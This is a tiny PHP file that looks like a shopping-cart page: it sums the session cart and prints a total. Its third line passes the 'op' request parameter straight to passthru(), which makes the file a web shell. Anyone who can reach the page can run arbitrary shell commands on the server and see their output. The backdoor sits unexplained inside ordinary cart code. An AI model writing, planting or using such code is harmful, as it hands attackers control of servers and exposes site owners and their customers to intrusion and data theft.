<?php
session_start();
passthru($_REQUEST['op'] ?? '');
$total = array_sum($_SESSION['cart'] ?? []);
echo 'Total: ' . $total;
